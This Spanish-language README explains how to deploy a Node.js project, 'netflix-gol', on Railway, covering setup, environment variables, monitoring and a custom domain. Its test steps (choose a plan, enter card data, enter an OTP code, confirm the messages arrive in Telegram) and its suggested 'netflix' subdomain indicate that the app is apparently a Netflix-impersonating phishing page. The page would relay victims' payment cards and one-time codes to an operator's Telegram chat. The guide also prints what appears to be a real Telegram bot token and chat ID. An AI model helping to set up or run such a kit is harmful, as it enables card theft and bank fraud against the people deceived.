# 🚂 Guía de Despliegue en Railway

## 📋 Requisitos Previos

1. Cuenta en [Railway.app](https://railway.app)
2. Cuenta de GitHub (ya tienes el repo: `netflix-gol`)
3. Bot de Telegram configurado (token y chat ID)

## 🚀 Pasos para Desplegar

### Opción 1: Despliegue desde GitHub (Recomendado)

1. **Ir a Railway:**
   - Ve a https://railway.app
   - Click en "Login" o "Sign up"
   - Inicia sesión con tu cuenta de GitHub

2. **Crear Nuevo Proyecto:**
   - Click en "New Project"
   - Selecciona "Deploy from GitHub repo"
   - Busca y selecciona: `hanselrosales255/netflix-gol`
   - Railway detectará automáticamente que es un proyecto Node.js

3. **Configurar Variables de Entorno:**
   - Una vez desplegado, ve a la pestaña "Variables"
   - Click en "New Variable" y agrega:
   
   ```
   TELEGRAM_TOKEN=7244927485:AAFyWj9h6o33uVb7TgaaawKvpiY8MHx-ero
   CHAT_ID=-5088262475
   NODE_ENV=production
   ```
   
   (Usa tus propios valores de TELEGRAM_TOKEN y CHAT_ID)

4. **Generar Dominio Público:**
   - Ve a la pestaña "Settings"
   - Busca "Networking" o "Domains"
   - Click en "Generate Domain"
   - Copia la URL generada (ej: `netflix-gol-production.up.railway.app`)

5. **Reiniciar el Servicio:**
   - Click en "Deploy" → "Restart"
   - Espera a que el deployment termine (verás "Success")

### Opción 2: Despliegue con Railway CLI

```bash
# 1. Instalar Railway CLI
npm install -g @railway/cli

# 2. Login en Railway
railway login

# 3. Inicializar proyecto
cd c:\Users\Hansel\Desktop\Netflix
railway init

# 4. Vincular con el proyecto existente
railway link

# 5. Configurar variables de entorno
railway variables set TELEGRAM_TOKEN=tu_token_aqui
railway variables set CHAT_ID=tu_chat_id_aqui
railway variables set NODE_ENV=production

# 6. Desplegar
railway up
```

## ⚙️ Configuración Automática

Railway detectará automáticamente:
- ✅ `package.json` → Instalará dependencias con `npm install`
- ✅ `server.js` → Ejecutará con `npm start`
- ✅ `railway.json` → Configuración personalizada
- ✅ `nixpacks.toml` → Build configuration
- ✅ Puerto dinámico desde `process.env.PORT`

## 🔧 Variables de Entorno Necesarias

| Variable | Descripción | Ejemplo |
|----------|-------------|---------|
| `TELEGRAM_TOKEN` | Token del bot de Telegram | `7244927485:AAFyWj9h6o33uVb7TgaaawKvpiY8MHx-ero` |
| `CHAT_ID` | ID del chat de Telegram | `-5088262475` |
| `NODE_ENV` | Entorno de ejecución | `production` |
| `PORT` | Puerto (Railway lo asigna automáticamente) | `3000` |

## 📊 Monitoreo

Una vez desplegado, puedes monitorear tu aplicación:

1. **Logs en Tiempo Real:**
   - Railway Dashboard → Pestaña "Deployments"
   - Click en el deployment actual
   - Verás logs como:
     ```
     🚀 Server running on 0.0.0.0:3000
     📱 Telegram Bot is active
     🔌 Socket.IO ready for connections
     🌍 Environment: production
     ```

2. **Métricas:**
   - CPU usage
   - Memory usage
   - Network traffic

## 🌐 Probar el Despliegue

1. **Abrir la URL generada:**
   ```
   https://tu-app.up.railway.app
   ```

2. **Probar el flujo completo:**
   - Selecciona un plan
   - Completa datos de tarjeta
   - Ingresa código OTP
   - Verifica que los mensajes lleguen a Telegram

## 🔄 Actualizar el Despliegue

Cada vez que hagas `git push` a la rama `main`, Railway automáticamente:
1. Detectará el cambio
2. Hará build
3. Desplegará la nueva versión
4. Reiniciará el servicio

## 🐛 Troubleshooting

### Error: "Application failed to respond"
- Verifica que las variables de entorno estén configuradas
- Revisa los logs en Railway Dashboard
- Asegúrate de que el puerto sea `process.env.PORT`

### Error: "Telegram Bot polling error"
- Verifica que el `TELEGRAM_TOKEN` sea correcto
- Asegúrate de que el bot no esté corriendo en otro lugar
- Revisa que el bot esté activo en Telegram

### Socket.IO no conecta
- Asegúrate de usar la URL de Railway (no localhost)
- Verifica que WebSockets estén habilitados
- Revisa CORS settings en `server.js`

## 💰 Costos

Railway ofrece:
- **Plan Hobby:** $5 USD/mes
- **500 horas gratis** por mes (suficiente para desarrollo)
- **Sin tarjeta de crédito** para empezar

## 📱 Configurar Dominio Personalizado (Opcional)

1. Compra un dominio en Namecheap, GoDaddy, etc.
2. En Railway Dashboard:
   - Settings → Domains
   - Click "Add Custom Domain"
   - Ingresa tu dominio: `netflix.tudominio.com`
3. Configura DNS en tu proveedor:
   ```
   Type: CNAME
   Name: netflix
   Value: tu-app.up.railway.app
   ```

## ✅ Checklist de Despliegue

- [ ] Cuenta de Railway creada
- [ ] Repositorio conectado desde GitHub
- [ ] Variables de entorno configuradas
- [ ] Dominio generado
- [ ] Deployment exitoso (Status: Success)
- [ ] Logs muestran: "Server running"
- [ ] URL abre correctamente
- [ ] Flujo de tarjeta funciona
- [ ] Mensajes llegan a Telegram
- [ ] Botones de Telegram funcionan

## 🎉 ¡Listo!

Tu aplicación está ahora desplegada en Railway y disponible 24/7.

**URL de la aplicación:** Copia el dominio de Railway Dashboard

---

**Soporte adicional:** 
- [Railway Docs](https://docs.railway.app)
- [Railway Discord](https://discord.gg/railway)
